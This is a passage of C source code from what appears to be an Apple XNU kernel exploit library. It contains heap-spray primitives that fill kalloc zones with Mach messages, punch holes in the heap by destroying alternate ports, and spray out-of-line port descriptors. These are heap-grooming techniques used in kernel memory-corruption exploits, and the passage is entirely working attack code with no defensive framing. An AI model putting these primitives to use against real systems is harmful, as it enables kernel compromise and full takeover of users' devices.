            kalloc_size, message_count, messages_per_port);
    // Update the holding ports.
    holding_ports->ports = ports.ports + ports_used;
    holding_ports->count = ports.count - ports_used;
    // Return the ipc_kmsg_kalloc_fragmentation_spray object.
    spray->holding_ports.ports = ports.ports;
    spray->holding_ports.count = ports_used;
    spray->spray_size = sprayed_count * kalloc_size;
    spray->kalloc_size_per_port = kalloc_size * messages_per_port;
}

void
ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(
        struct ipc_kmsg_kalloc_fragmentation_spray *spray,
        size_t free_size,
        int from_end) {
    mach_port_t *ports = spray->holding_ports.ports;
    size_t ports_left = spray->holding_ports.count;
    size_t kalloc_size_per_port = spray->kalloc_size_per_port;
    assert((ports_left % 2) == 0);
    // Initialize the iteration parameters.
    size_t port_idx;
    int increment;
    if (from_end >= 0) {
        port_idx = 0;
        increment = 2;
    } else {
        port_idx = ports_left - 2;
        increment = -2;
    }
    // Iterate over the ports in pairs.
    for (; free_size > 0 && ports_left > 0; ports_left -= 2, port_idx += increment) {
        // Ensure this port is valid.
        mach_port_t port = ports[port_idx];
        if (!MACH_PORT_VALID(port)) {
            continue;
        }
        // Destroy the port, freeing all enqueued messages. Mark the port as dead in the
        // holding ports array.
        mach_port_destroy(mach_task_self(), port);
        ports[port_idx] = MACH_PORT_DEAD;
        free_size -= kalloc_size_per_port;
    }
}

void
ipc_kmsg_kalloc_spray_(struct ipc_kmsg_kalloc_spray *spray,
        const void *data,
        size_t kalloc_size,
        size_t spray_size,
        size_t kalloc_allocation_limit_per_port,
        struct holding_port_array *holding_ports) {
    // Check parameters and adjust default values.
    assert(kalloc_size <= spray_size);
    assert(kalloc_allocation_limit_per_port == 0
            || kalloc_allocation_limit_per_port >= kalloc_size);
    // Compute the number of messages in each port. A value of zero propagates correctly.
    size_t messages_per_port = kalloc_allocation_limit_per_port / kalloc_size;
    if (messages_per_port > MACH_PORT_QLIMIT_MAX) {
        messages_per_port = MACH_PORT_QLIMIT_MAX;
    }
    // Compute the total number of messages.
    size_t message_count = spray_size / kalloc_size;
    // Call the implementation.
    struct holding_port_array ports = *holding_ports;
    size_t ports_used = ports.count;
    size_t sprayed_count = ipc_kmsg_kalloc_spray(ports.ports, &ports_used,
            data, kalloc_size, message_count, messages_per_port);
    // Update the holding ports.
    holding_ports->ports = ports.ports + ports_used;
    holding_ports->count = ports.count - ports_used;
    // Return the ipc_kmsg_kalloc_fragmentation_spray object.
    spray->holding_ports.ports = ports.ports;
    spray->holding_ports.count = ports_used;
    spray->spray_size = sprayed_count * kalloc_size;
    spray->kalloc_allocation_size_per_port = kalloc_size * messages_per_port;
}

void
ool_ports_spray_(struct ool_ports_spray *spray,
        const mach_port_t *ool_ports,
        size_t ool_port_count,
        mach_msg_type_name_t ool_ports_disposition,
        size_t ool_port_descriptor_count,
        size_t ool_port_descriptors_per_message,
        size_t ipc_kmsg_size,
        size_t messages_per_port,
        struct holding_port_array *holding_ports) {
    // Check parameters.
    assert(ool_port_count <= max_ool_ports_per_message);
    // Call the implementation.
    struct holding_port_array ports = *holding_ports;
    size_t ports_used = ports.count;
    size_t sprayed_count = ool_ports_spray(ports.ports, &ports_used,
            ool_ports, ool_port_count, ool_ports_disposition,
            ool_port_descriptor_count, ool_port_descriptors_per_message,
            ipc_kmsg_size, messages_per_port);
    // Update the holding ports.
    holding_ports->ports = ports.ports + ports_used;
    holding_ports->count = ports.count - ports_used;
    // Return the ipc_kmsg_kalloc_fragmentation_spray object.
    spray->holding_ports.ports = ports.ports;
    spray->holding_ports.count = ports_used;
    spray->sprayed_count = sprayed_count;
}
